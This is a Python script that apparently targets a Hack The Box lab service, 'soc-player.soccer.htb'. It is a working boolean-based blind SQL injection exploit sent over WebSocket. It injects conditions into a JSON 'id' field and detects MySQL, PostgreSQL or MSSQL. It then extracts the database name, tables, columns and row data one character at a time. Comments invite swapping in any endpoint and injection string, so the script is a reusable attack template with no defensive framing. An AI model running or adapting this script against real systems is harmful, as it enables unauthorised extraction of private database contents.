import asyncio
import websockets
import string

# ================== CONFIG ==================
WS_URL = "ws://soc-player.soccer.htb:9091"   # Replace with your WebSocket endpoint
SUCCESS = "Ticket Exists"                     # Replace with your success indicator
FAILURE = "Ticket Doesn't Exist"             # Replace with your failure indicator

# Charset includes upper/lower letters, digits, and common symbols
CHARSET = string.ascii_letters + string.digits + "_-{}@!$%^&*(). "
# ============================================

async def ws_request(payload):
    """Send payload over WebSocket and return True/False based on response."""
    async with websockets.connect(WS_URL) as ws:
        await ws.send(payload)
        resp = await ws.recv()
        return SUCCESS in resp

def make_payload(condition):
    """Wrap SQL condition into JSON injection."""
    return f'{{"id":"1 OR ({condition}) -- -"}}' # Replace with your injection

def case_sensitive_condition(dbms, query, pos, char):
    """Return a condition that preserves exact case based on DBMS."""
    if dbms == "MySQL":
        return f"substring(({query}),{pos},1)=BINARY'{char}'"
    elif dbms == "PostgreSQL":
        return f"substring(({query}) from {pos} for 1)='{char}'"
    else:  # MSSQL
        return f"substring(({query}),{pos},1) COLLATE Latin1_General_CS_AS='{char}'"

async def detect_dbms():
    """Try to detect the backend DBMS."""
    tests = {
        "MySQL": "length(database())>0",
        "PostgreSQL": "length(current_database())>0",
        "MSSQL": "len(db_name())>0",
    }
    for dbms, condition in tests.items():
        if await ws_request(make_payload(condition)):
            print(f"[+] Detected DBMS: {dbms}")
            return dbms
    print("[-] Could not detect DBMS")
    return None

async def extract_string(query, dbms, max_len=50):
    """Extract string from SQL query result using boolean-based blind method."""
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in CHARSET:
            condition = case_sensitive_condition(dbms, query, pos, c)
            payload = make_payload(condition)
            if await ws_request(payload):
                result += c
                print(f"[+] Found char {pos}: {c} â†’ {result}")
                found = True
                break
        if not found:
            break
    return result

async def main():
    dbms = await detect_dbms()
    if not dbms:
        return

    # Step 1: Extract DB name
    if dbms == "MySQL":
        db_name = await extract_string("database()", dbms)
    elif dbms == "PostgreSQL":
        db_name = await extract_string("current_database()", dbms)
    else:  # MSSQL
        db_name = await extract_string("db_name()", dbms)

    print(f"[DB] Database name: {db_name}")

    # Step 2: Enumerate tables (first 5 for demo)
    for t in range(0, 5):
        if dbms in ["MySQL", "PostgreSQL"]:
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT 1 OFFSET {t}"
        else:  # MSSQL
            query = f"SELECT table_name FROM information_schema.tables WHERE table_catalog='{db_name}' ORDER BY table_name OFFSET {t} ROWS FETCH NEXT 1 ROWS ONLY"

        table = await extract_string(query, dbms)
        if not table:
            break
        print(f"[TABLE] {table}")

        # Step 3: Enumerate columns (first 5 for demo)
        for c in range(0, 5):
            if dbms in ["MySQL", "PostgreSQL"]:
                query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table}' LIMIT 1 OFFSET {c}"
            else:  # MSSQL
                query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' ORDER BY column_name OFFSET {c} ROWS FETCH NEXT 1 ROWS ONLY"

            column = await extract_string(query, dbms)
            if not column:
                break
            print(f"    [COLUMN] {column}")

            # Step 4: Extract first 3 rows of data
            for r in range(0, 3):
                if dbms in ["MySQL", "PostgreSQL"]:
                    query = f"SELECT {column} FROM {table} LIMIT 1 OFFSET {r}"
                else:  # MSSQL
                    query = f"SELECT {column} FROM {table} ORDER BY {column} OFFSET {r} ROWS FETCH NEXT 1 ROWS ONLY"

                data = await extract_string(query, dbms)
                if not data:
                    break
                print(f"        [ROW {r}] {data}")

if __name__ == "__main__":
    asyncio.run(main())
